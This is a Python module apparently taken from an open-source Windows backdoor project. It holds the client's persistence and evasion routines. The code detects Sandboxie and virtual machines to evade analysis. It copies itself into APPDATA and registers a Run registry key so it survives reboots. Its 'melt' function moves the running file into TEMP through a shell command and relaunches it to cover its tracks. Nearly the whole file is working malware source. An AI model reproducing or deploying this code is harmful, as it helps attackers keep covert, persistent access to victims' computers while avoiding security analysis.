"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""

import ctypes
import os
import shutil
import subprocess
import sys
import winreg

import wmi

from src import errors

TMP = os.path.normpath(os.environ["TEMP"])  # tmp location
COPY_LOCATION = os.path.normpath(os.environ["APPDATA"])  # appdata location
REG_STARTUP_NAME = "pb"  # reg value name
FILE_PATH = os.path.realpath(sys.argv[0])  # file path to self


def detect_sandboxie():
    try:
        ctypes.windll.LoadLibrary("SbieDll.dll")
    except Exception:
        return False
    return True


def detect_vm():
    _wmi = wmi.WMI()
    for objDiskDrive in _wmi.query("Select * from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return True
    return False


def remove_from_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, REG_STARTUP_NAME)
        winreg.CloseKey(key)
    except FileNotFoundError:
        raise errors.ClientSocket.Persistence.StartupError("Program is not registered in startup.")
    except WindowsError as e:
        raise errors.ClientSocket.Persistence.StartupError(f"Error removing value {e}")


def add_startup():
    try:
        app_path = os.path.join(COPY_LOCATION, os.path.basename(FILE_PATH))

        if not os.path.normpath(os.path.dirname(FILE_PATH)) == COPY_LOCATION:
            try:
                shutil.copyfile(FILE_PATH, app_path)
            except Exception as e:
                raise WindowsError(e)

        regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(regkey, REG_STARTUP_NAME, 0, winreg.REG_SZ, f"\"{app_path}\"")
        winreg.CloseKey(regkey)
    except WindowsError as e:
        raise errors.ClientSocket.Persistence.StartupError(f"Unable to add to startup {e}")


def melt():
    # ignore if the path is in copy folder (used for startup) as well

    curr_file_dir = os.path.normpath(os.path.dirname(FILE_PATH))
    if not (curr_file_dir == TMP or curr_file_dir == COPY_LOCATION):
        if not os.path.exists(TMP):
            try:
                os.mkdir(TMP)
            except OSError:  # if there is a problem creating the folder, don't melt
                return

        new_file = os.path.join(TMP, os.path.basename(FILE_PATH))

        command = f"timeout 2 & move /y \"{FILE_PATH}\" \"{new_file}\" & cd /d \"{TMP}\" & \"{new_file}\""
        subprocess.Popen(command, shell=True)
        sys.exit(0)

